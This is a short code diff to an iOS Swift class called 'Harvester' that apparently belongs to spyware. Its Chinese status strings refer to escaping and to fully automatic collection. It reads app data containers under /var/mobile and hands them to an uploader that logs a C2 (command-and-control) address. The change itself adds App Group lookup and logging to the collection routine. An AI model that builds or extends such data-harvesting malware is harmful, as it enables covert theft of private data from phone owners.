@@ -58,8 +58,11 @@ final class Harvester: ObservableObject {
         phase = "逃逸中…"
         let up = Uploader(baseURL: base, deviceID: deviceID)
         let root = "/var/mobile/Containers/Data/Application"
-        let g = groupID
+        let (resolved, tried) = AppGroup.resolve()
+        let g = resolved ?? groupID
         let full = fullMode
+        log("App Group 候选: \(tried.joined(separator: ", "))")
+        log(resolved != nil ? "使用 group=\(g)" : "⚠️ 没有可用 group（可能未授予 App Groups）")
 
         log("=== 全自动采集开始 · iOS \(UIDevice.current.systemVersion) ===")
         log("C2=\(c2Base)  group=\(g)")
